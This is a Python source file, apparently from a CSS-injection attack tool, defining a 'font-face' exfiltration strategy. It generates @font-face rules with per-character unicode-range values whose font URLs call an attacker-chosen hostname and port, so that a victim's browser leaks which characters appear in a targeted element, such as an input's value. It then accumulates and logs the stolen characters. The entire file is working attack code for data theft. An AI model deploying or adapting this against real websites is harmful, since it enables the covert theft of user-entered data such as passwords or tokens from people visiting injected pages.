import asyncio
import time
import urllib.parse

from cssinj.console import Console, LogLevel
from cssinj.strategies.base import BaseExfiltrationStrategy
from cssinj.utils import default
from cssinj.utils.dom import Attribut, Element


class FontFaceStrategy(BaseExfiltrationStrategy):
    """
    Font face exfiltration strategy.
    Exfiltrates text content using unicode-range font loading.
    Note: Only detects which characters are present, not their order.
    """

    name = "font-face"

    def __init__(
        self,
        hostname: str,
        port: int,
        element: str = "input",
        attribut: str = "value",
        timeout: float = 3.0,
    ) -> None:
        super().__init__(hostname, port, timeout)
        self.element = element
        self.attribut = attribut
        self._timeout_tasks: dict[int, asyncio.Task] = {}

    def generate_start_payload(self, client) -> str:
        client.data = ""  # Reset data for this client
        return self._generate_font_face(client)

    def generate_next_payload(self, client) -> str:
        return self._generate_font_face(client)

    def handle_valid(self, client, data: str) -> str:
        # Accumulate characters (note: order is not guaranteed)
        if data not in client.data:
            client.data += data

        client.last_seen = time.time()

        # Cancel existing timeout task
        if client.id in self._timeout_tasks:
            self._timeout_tasks[client.id].cancel()

        # Start new timeout task
        self._timeout_tasks[client.id] = asyncio.create_task(self._wait_for_timeout(client))

        return "valid"

    def handle_end(self, client) -> str:
        # Create element with the exfiltrated text
        element = Element(name=self.element)
        element.attributs.append(Attribut(name="textContent", value=client.data))
        client.elements.append(element)

        # Log the result
        Console.log(
            LogLevel.END_EXFILTRATION,
            f"[{client.id}] - Characters found in {self.element}: {client.data}",
        )

        # Cleanup
        if client.id in self._timeout_tasks:
            del self._timeout_tasks[client.id]

        client.data = ""

        return "end"

    def _generate_font_face(self, client) -> str:
        css = ""
        for char in default.PRINTABLE:
            encoded = urllib.parse.quote_plus(char)
            unicode_point = f"U+{ord(char):04X}"
            css += (
                f"@font-face{{"
                f"font-family:exfil;"
                f'src:url("//{self.hostname}:{self.port}/v?cid={client.id}&t={encoded}");'
                f"unicode-range:{unicode_point};"
                f"}}"
            )
        css += f"{self.element}{{font-family:exfil;}}"
        return css

    async def _wait_for_timeout(self, client) -> None:
        """Wait for timeout then trigger end of exfiltration."""
        await asyncio.sleep(self.timeout)
        self.handle_end(client)
